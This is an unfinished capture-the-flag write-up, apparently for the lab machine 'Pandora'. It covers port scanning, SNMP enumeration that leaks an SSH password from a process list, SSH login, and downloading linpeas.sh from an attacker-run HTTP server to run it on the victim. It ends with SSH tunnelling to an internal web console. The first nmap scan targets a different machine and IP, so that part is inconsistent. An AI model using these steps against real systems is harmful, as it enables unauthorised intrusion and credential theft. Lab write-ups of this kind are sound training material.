  # Enumeration
  
  ### NMAP
  
  ```console
  noob2uub@kali:~/Documents/HTB/RouterSpace$ nmap -sC -sV -v -p 1-65535 10.10.11.148
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 13:59 PDT

Nmap scan report for 10.10.11.148
Host is up (0.071s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
|_http-favicon: Unknown favicon MD5: 5B124C159840B22F4C3D3E581C6693B9
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-6158
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 76
|     ETag: W/"4c-3mROIBHgrB5sPHpvNoVBEYqYCNo"
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: oeJ 32X ap R w bU }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-54026
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-54750
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: RouterSpace
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=4/18%Time=625DD1B7%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=4/18%Time=625DD1B7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,13E4,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
SF:X-Cdn:\x20RouterSpace-54026\r\nAccept-Ranges:\x20bytes\r\nCache-Control
SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
SF:20Mon,\x2018\x20Apr\x202022\x2021:00:38\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<
SF:head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\
SF:x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/
SF:magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,10
SF:8,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
SF:RouterSpace-54750\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZ
SF:YGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Mon,\x2018\x20Apr\x202022\x2021:00
SF::38\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(FourOhFourRequest,131,"HTTP/1\.1\x20200\x20OK\r\nX-Po
SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-6158\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2076\r\nETag:\x20W/
SF:\"4c-3mROIBHgrB5sPHpvNoVBEYqYCNo\"\r\nDate:\x20Mon,\x2018\x20Apr\x20202
SF:2\x2021:00:38\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20oeJ\x20\x20\x2032X\x20ap\x20R\
SF:x20\x20\x20w\x20bU\x20\x20}\n\n\n\n\n\n\n");

NSE: Script Post-scanning.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.28 seconds
```
I couldn't find anything here so I started a UDP scan and found that port 161 was open

```Console
noob2uub@kali:~/Documents/HTB/Pandor$ sudo nmap -sC -sV -sU -A -v 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 16:13 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating Ping Scan at 16:13
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 16:13, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:13
Completed Parallel DNS resolution of 1 host. at 16:13, 0.00s elapsed
Initiating UDP Scan at 16:13
Scanning 10.10.11.136 [1000 ports]
Discovered open port 161/udp on 10.10.11.136
```

### SNMP Check

So I decided to run an SNMP sheck since that is what port 161 is for.

```console
noob2uub@kali:~/Documents/HTB/Pandor$ snmp-check 10.10.11.136 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'

  [*] System information:

  Host IP address               : 10.10.11.136
  Hostname                      : pandora
  Description                   : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
  Contact                       : Daniel
  Location                      : Mississippi
  Uptime snmp                   : 11:35:26.05
  Uptime system                 : 11:35:15.66
  System date                   : 2022-4-18 23:16:55.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64noob2uub@kali:~/Documents/HTB/Pandor$ snmp-check 10.10.11.136 -c public
  TCP segments received         : 436542
  TCP segments sent             : 503890
  TCP segments retrans          : 29073
  Input datagrams               : 489199
  Delivered datagrams           : 481262
  Output datagrams              : 507508

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 65536
  In octets                     : 14115727
  Out octets                    : 14115727

  Interface                     : [ up ] VMware VMXNET3 Ethernet Controller
  Id                            : 2
  Mac Address                   : 00:50:56:b9:b0:fb
  Type                          : ethernet-csmacd
  Speed                         : 4294 Mbps
  MTU                           : 1500
  In octets                     : 36946465
  Out octets                    : 259298475


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  2                     10.10.11.136          255.255.254.0         1                   
  1                     127.0.0.1             255.0.0.0             0                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.10.2            0.0.0.0               1                   
  10.10.10.0            0.0.0.0               255.255.254.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               22                    0.0.0.0               0                     listen              
  10.10.11.136          41460                 10.10.14.18           4444                  established         
  10.10.11.136          41838                 10.10.14.18           4444                  established         
  10.10.11.136          46312                 1.1.1.1               53                    synSent             
  10.10.11.136          58698                 10.10.16.10           9090                  closeWait           
  10.10.11.136          58868                 10.10.16.10           9090                  closeWait           
  10.10.11.136          58890                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59258                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59310                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59456                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59548                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59698                 10.10.16.10           9090                  closeWait           
  10.10.11.136          60144                 10.10.16.10           9090                  closeWait           
  127.0.0.1             3306                  0.0.0.0               0                     listen              
  127.0.0.53            53                    0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  127.0.0.53            53                  

[*] Processes:
```

There was much more information processed but scaning through it I found credentials. 

```console
  1134                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
```

Now that we have credentials lets see what we can do with SSH. 

### SSH 

```console
noob2uub@kali:~/Documents/HTB/Pandor$ ssh daniel@10.10.11.136
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Apr 15:55:48 UTC 2022

  System load:           0.1
  Usage of /:            63.0% of 4.87GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca19

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ 
```

Nice we now have access to Daniels account. 

After digging around we find Matts user account and the user flag. However, Daniel can not access it.

```console
daniel@pandora:~$ ls -la
total 28
drwxr-xr-x 4 daniel daniel 4096 Apr 20 15:55 .
drwxr-xr-x 4 root   root   4096 Dec  7 14:32 ..
lrwxrwxrwx 1 daniel daniel    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel 3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel 4096 Apr 20 15:55 .cache
-rw-r--r-- 1 daniel daniel  807 Feb 25  2020 .profile
drwx------ 2 daniel daniel 4096 Dec  7 14:32 .ssh
daniel@pandora:~$ cd ..
daniel@pandora:/home$ ls
daniel  matt
daniel@pandora:/home$ cd matt
daniel@pandora:/home/matt$ ls
user.txt
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
daniel@pandora:/home/matt$ 
```

Lets put Linpeas on the victim machine and see what we find.

### HTTP Server
```console
noob2uub@kali:~/Documents/Tools$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.136 - - [20/Apr/2022 09:42:06] "GET /linpeas.sh HTTP/1.1" 200 -
```
### WGET to transfer Linpeas
```console
daniel@pandora:~$ wget 10.10.14.49:8000/linpeas.sh
--2022-04-20 16:41:04--  http://10.10.14.49:8000/linpeas.sh
Connecting to 10.10.14.49:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 765823 (748K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[====================================================================================================================>] 747.87K  1.72MB/s    in 0.4s    

2022-04-20 16:41:04 (1.72 MB/s) - ‘linpeas.sh’ saved [765823/765823]

daniel@pandora:~$ chmod -x .linpeas.sh
chmod: cannot access '.linpeas.sh': No such file or directory
daniel@pandora:~$ chmod -x linpeas.sh
daniel@pandora:~$ ./linpeas.sh
-bash: ./linpeas.sh: Permission denied
daniel@pandora:~$ chmod 777 linpeas.sh
daniel@pandora:~$ ./linpeas.sh
```


```console
drwxr-xr-x 2 root root 4096 Dec  3 12:57 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3 12:56 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
lrwxrwxrwx 1 root root 31 Dec  3 12:53 cdsites-enabled/pandora.conf -> ../sites-available/pandora.conf
  ServerName pandora.panda.htb
```
Looks like Matt can run this if we can get access to his account

```console

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
```
Taking a look at the available sites and pandora.conf we find some interesting information hosted on localhost:80

```console
daniel@pandora:/etc/apache2$ ls
apache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled
daniel@pandora:/etc/apache2$ cd sites-available/
daniel@pandora:/etc/apache2/sites-available$ ls
000-default.conf  default-ssl.conf  pandora.conf
daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
Lets now take a look at the /var/www/pandora folder

```console
daniel@pandora:/var/www$ ls
html  pandora
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
daniel@pandora:/var/www/pandora$ cd pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ ls
ajax.php    composer.json  DEBIAN                extras   images        mobile                            pandora_console_logrotate_suse    pandoradb.sql                     vendor
attachment  composer.lock  docker_entrypoint.sh  fonts    include       operation                         pandora_console_logrotate_ubuntu  pandora_websocket_engine.service  ws.php
audit.log   COPYING        Dockerfile            general  index.php     pandora_console.log               pandora_console_upgrade           tests
AUTHORS     DB_Dockerfile  extensions            godmode  install.done  pandora_console_logrotate_centos  pandoradb_data.sql                tools
daniel@pandora:/var/www/pandora/pandora_console$ 
```

we see that the content is in pandora console


We know that there is a webserver running and we can see the server is pandora.panda.htp and its running on localhost, lets take a look at the host fist.

```console
daniel@pandora:/etc$ cat hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
### SSH Tunneling to access Local Host site

```console
noob2uub@kali:~$ ssh -L 8080:127.0.0.1:80 daniel@10.10.11.136
daniel@10.10.11.136's password: 
Permission denied, please try again.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Apr 17:34:56 UTC 2022

  System load:           0.0
  Usage of /:            63.0% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca19

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 20 17:32:16 2022 from 127.0.0.1

```

We should now beable to access localhost.localdomain from our machine, but that did not bring anything up so lets try localhost.localdomain/pandora_console and we see that its running an FMS site.

![Screenshot_2022-04-20_10-41-55](https://user-images.githubusercontent.com/68706090/164290551-bde10855-9663-401a-a897-d83ce48693a8.png)
